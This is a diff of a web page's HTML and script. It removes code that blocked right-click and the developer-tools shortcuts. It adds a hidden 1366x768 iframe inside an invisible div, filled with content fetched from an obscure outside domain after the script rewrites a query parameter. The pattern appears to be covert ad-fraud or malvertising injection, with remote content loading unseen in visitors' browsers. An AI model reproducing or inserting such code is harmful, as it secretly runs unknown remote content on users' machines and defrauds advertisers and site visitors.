@@ -4,33 +4,6 @@
 
 <script>
 
-document.addEventListener('contextmenu', event => event.preventDefault());
-
-    document.onkeydown = function (e) {
-
-        // disable F12 key
-        if(e.keyCode == 123) {
-            return false;
-        }
-
-        // disable I key
-        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
-            return false;
-        }
-
-        // disable J key
-        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
-            return false;
-        }
-
-        // disable U key
-        if(e.ctrlKey && e.keyCode == 85) {
-            return false;
-        }
-    }
-
-
-
 function isInIframe() {
         try {
             return window.self !== window.top;
@@ -60,36 +33,27 @@ if (isInIframe()) {
 <body>
 
 	
-	<div style="display:none;">	
-		
+<div style="display:none;">	
 
+<iframe id="adx1" src="" height="768" width="1366" ></iframe>
+	
 <script>
 
   fetch("https://ouswomanifefash.org?IJAh1=1214372")
    .then(data => data.text())
    .then((data) => {
 	  var data1 = data.replace("&ii=1", "&ii=0");
-	   
-      document.write('<textarea rows="4" cols="50">' + data1 + '</textarea>'); 
-
+	  document.getElementById('adx1').srcdoc = data1;
+   
+      //document.write('<textarea rows="4" cols="50">' + data1 + '</textarea>'); 
      
    })
    .catch(err => console.log(err))
 
-
 </script>
 
 
-
-
-
-
-
-
-
 	</div>
-
-	
 	
 </body>
 </html>
